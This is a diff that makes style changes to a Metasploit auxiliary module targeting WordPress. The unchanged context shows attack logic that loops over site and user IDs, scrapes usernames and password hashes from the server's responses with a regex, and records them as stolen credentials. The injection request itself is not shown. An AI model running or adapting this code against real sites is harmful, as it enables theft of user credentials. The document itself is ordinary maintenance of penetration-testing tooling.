@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -40,7 +41,8 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('TABLE_PREFIX', [true,	'Wordpress table prefix', 'wp_']),
         OptInt.new('SITE_ITERATIONS', [true, 'Number of sites to iterate', 25]),
         OptInt.new('USER_ITERATIONS', [true, 'Number of users to iterate', 25])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def table_prefix
@@ -108,11 +110,9 @@ class MetasploitModule < Msf::Auxiliary
     users_found = false
 
     (1..site_iterations).each do |site_id|
-
       vprint_status("Trying site_id #{site_id}...")
 
       (1..user_iterations).each do |user_id|
-
         vprint_status("Trying user_id #{user_id}...")
 
         # used to cache the statement
@@ -142,19 +142,18 @@ class MetasploitModule < Msf::Auxiliary
         end
 
         match = result.body.scan(/.*"user_login";s:[0-9]+:"([^"]*)";s:[0-9]+:"user_pass";s:[0-9]+:"([^"]*)".*/)[0]
-        unless match.nil?
-          print_good("Username: #{match[0]}")
-          print_good("Password Hash: #{match[1]}")
-          report_cred(
-            ip: rhost,
-            port: rport,
-            service_name: ssl ? 'https' : 'http',
-            user: match[0],
-            password: match[1],
-            proof: result.body
-          )
-          users_found = true
-        end
+        next if match.nil?
+        print_good("Username: #{match[0]}")
+        print_good("Password Hash: #{match[1]}")
+        report_cred(
+          ip: rhost,
+          port: rport,
+          service_name: ssl ? 'https' : 'http',
+          user: match[0],
+          password: match[1],
+          proof: result.body
+        )
+        users_found = true
       end
     end
     print_error('No users found :(') unless users_found
